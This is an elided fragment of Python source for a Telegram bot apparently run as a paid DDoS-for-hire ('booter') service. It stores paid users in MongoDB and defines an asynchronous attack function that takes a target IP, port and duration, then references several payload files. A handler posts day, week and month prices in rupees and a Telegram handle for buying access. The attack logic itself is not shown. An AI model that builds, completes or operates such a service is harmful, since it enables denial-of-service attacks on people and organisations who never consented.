...
error_channel_id = -1002389453195

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['Harvinder']
users_collection = db.paidu
...
async def run_attack_command_async(target_ip, target_port, duration):
    files = ["binder1.txt", "binder2.txt", "binder3.txt", "binder4.txt", "binder5.txt", "jony1.txt", "jony2.txt", "jony3.txt", "jony4.txt", "jony5.txt"]
...
def handle_message(message):
    ...
    if message.text == "Buy Access! 💰":
        bot.reply_to(message, "* 𝑹𝑨𝑱𝑮𝑨𝑹 𝑫𝑫𝑶𝑺 𝑷𝑹𝑰𝑪𝑬\n\n[𝗣𝗿𝗲𝗺𝗶𝘂𝗺]\n> DAY - 69 INR\n> WEEK - 300 INR\n\n[𝗣𝗹𝗮𝘁𝗶𝗻𝘂𝗺]\n> MONTH - 700 INR\n\nDM TO BUY @NILESHMODZ!*", parse_mode='Markdown')
